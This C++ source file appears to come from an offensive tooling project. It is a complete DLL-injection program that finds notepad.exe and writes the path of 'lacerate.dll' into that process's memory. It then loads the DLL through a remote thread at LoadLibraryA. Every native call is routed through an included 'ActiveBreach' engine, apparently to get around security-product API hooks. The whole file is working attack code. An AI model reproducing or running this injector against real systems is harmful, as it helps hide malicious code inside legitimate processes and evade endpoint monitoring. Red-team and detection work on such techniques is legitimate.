#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

#include "../extern/ActiveBreach-Engine/C++/Include/ActiveBreach.hpp"

#include <string>

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define SystemProcessInformation 5

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* NtClose_t)(HANDLE);

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

DWORD ScopePID(const wchar_t* targetName) {
    ULONG size = 0x10000;
    PVOID buffer = malloc(size);
    if (!buffer) return 0;

    NTSTATUS status;
    while ((status = ab_call(NtQuerySystemInformation_t, "NtQuerySystemInformation", SystemProcessInformation, buffer, size, &size)) == 0xC0000004) {
        free(buffer);
        buffer = malloc(size);
        if (!buffer) return 0;
    }

    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed: 0x%X\n", status);
        free(buffer);
        return 0;
    }

    PSYSTEM_PROCESS_INFORMATION proc = (PSYSTEM_PROCESS_INFORMATION)buffer;
    while (true) {
        if (proc->ImageName.Buffer && _wcsicmp(proc->ImageName.Buffer, targetName) == 0) {
            DWORD pid = (DWORD)(ULONG_PTR)proc->UniqueProcessId;
            free(buffer);
            printf("Found %ws PID: %lu\n", targetName, pid);
            return pid;
        }
        if (!proc->NextEntryOffset) break;
        proc = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)proc + proc->NextEntryOffset);
    }

    free(buffer);
    printf("%ws not found.\n", targetName);
    return 0;
}

std::string GetLocalDllPath(const char* dllName) {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {
        printf("GetModuleFileNameA failed: %lu\n", GetLastError());
        return "";
    }

    PathRemoveFileSpecA(path);
    std::string fullPath = std::string(path) + "\\" + dllName;
    printf("Resolved DLL path: %s\n", fullPath.c_str());
    return fullPath;
}

int main() {
    printf("Initializing ActiveBreach...\n");

    ActiveBreach_launch();

    DWORD pid = ScopePID(L"notepad.exe");
    if (!pid) return 1;

    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid);
    if (!hProcess) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("Target process handle: 0x%p\n", hProcess);

    std::string dllPath = GetLocalDllPath("lacerate.dll");
    if (dllPath.empty()) {
        printf("DLL path resolution failed.\n");
        CloseHandle(hProcess);
        return 1;
    }

    SIZE_T dllLen = dllPath.length() + 1;
    PVOID remoteAddr = nullptr;
    SIZE_T regionSize = dllLen;

    NTSTATUS status = ab_call(NtAllocateVirtualMemory_t, "NtAllocateVirtualMemory", hProcess, &remoteAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("NtAllocateVirtualMemory failed: 0x%X\n", status);
        CloseHandle(hProcess);
        return 1;
    }
    printf("Remote memory allocated at: 0x%p\n", remoteAddr);

    status = ab_call(NtWriteVirtualMemory_t, "NtWriteVirtualMemory", hProcess, remoteAddr, (PVOID)dllPath.c_str(), (ULONG)dllLen, NULL);
    if (!NT_SUCCESS(status)) {
        printf("NtWriteVirtualMemory failed: 0x%X\n", status);
        CloseHandle(hProcess);
        return 1;
    }
    printf("DLL path written to remote memory.\n");

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        printf("GetModuleHandleA for kernel32.dll failed.\n");
        CloseHandle(hProcess);
        return 1;
    }

    PVOID loadLib = (PVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    if (!loadLib) {
        printf("GetProcAddress for LoadLibraryA failed.\n");
        CloseHandle(hProcess);
        return 1;
    }

    printf("Creating remote thread...\n");
    HANDLE hThread = NULL;
    status = ab_call(NtCreateThreadEx_t, "NtCreateThreadEx", &hThread, THREAD_ALL_ACCESS, NULL, hProcess, loadLib, remoteAddr, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status) || !hThread) {
        printf("NtCreateThreadEx failed: 0x%X\n", status);
        CloseHandle(hProcess);
        return 1;
    }

    printf("Remote thread created. Waiting...\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("DLL injection complete.\n");

    ab_call(NtClose_t, "NtClose", hThread);

    CloseHandle(hProcess);

    return 0;
}